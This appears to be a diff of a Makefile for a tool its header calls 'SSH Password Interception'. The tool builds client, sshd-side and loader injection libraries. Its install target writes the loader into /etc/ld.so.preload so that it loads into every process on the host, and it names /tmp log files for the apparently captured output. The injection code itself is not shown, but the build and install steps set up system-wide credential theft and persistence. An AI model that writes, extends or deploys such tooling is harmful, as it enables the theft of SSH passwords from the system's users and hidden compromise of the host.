@@ -1,26 +1,47 @@
-CXX = g++
-CXXFLAGS = -shared -fPIC -std=c++11 -Wall
-LDFLAGS = -ldl
+# SSH Password Interception - Master Makefile
+# Builds client, server and loader components
 
-TARGET = libssh_inject.so
-SOURCES = ssh_inject.cpp
-HEADERS = state.hpp
+.PHONY: all clean install client server loader
 
-all: $(TARGET)
+all: client server loader
 
-$(TARGET): $(SOURCES) $(HEADERS)
-	$(CXX) $(CXXFLAGS) -o $@ $(SOURCES) $(LDFLAGS)
+# Build client component
+client:
+	$(MAKE) -f ssh_inject.mk
 
+# Build server component
+server:
+	$(MAKE) -f sshd_inject.mk
+
+# Build loader component
+loader:
+	$(MAKE) -f loader.mk
+
+# Clean all components
 clean:
-	rm -f $(TARGET)
+	$(MAKE) -f ssh_inject.mk clean
+	$(MAKE) -f sshd_inject.mk clean
+	$(MAKE) -f loader.mk clean
 
-install: $(TARGET)
-	mkdir -p /usr/lib
-	cp $(TARGET) /usr/lib/
-	touch /tmp/ssh_inj.dbg
-	chmod 666 /tmp/ssh_inj.dbg
-	@echo "Installed $(TARGET) to /usr/lib/"
-	@echo "Created log file: /tmp/ssh_inj.dbg"
+# Install all components
+install: all
+	# Install client component
+	$(MAKE) -f ssh_inject.mk install
+	
+	# Install server component
+	$(MAKE) -f sshd_inject.mk install
+	
+	# Install loader component
+	$(MAKE) -f loader.mk install
+	
+	# Configure ld.so.preload
+	@echo "Setting up /etc/ld.so.preload..."
+	@echo "/usr/lib/libloader.so" > /etc/ld.so.preload
+	@echo "Installation complete!"
+	@echo "Log files:"
+	@echo " - Client: /tmp/ssh_inj.dbg"
+	@echo " - Server: /tmp/sshd_inj.dbg"
+	@echo " - Loader: /tmp/ssh_loader.dbg"
 
 test: $(TARGET)
 	LD_PRELOAD=./$(TARGET) ssh localhost
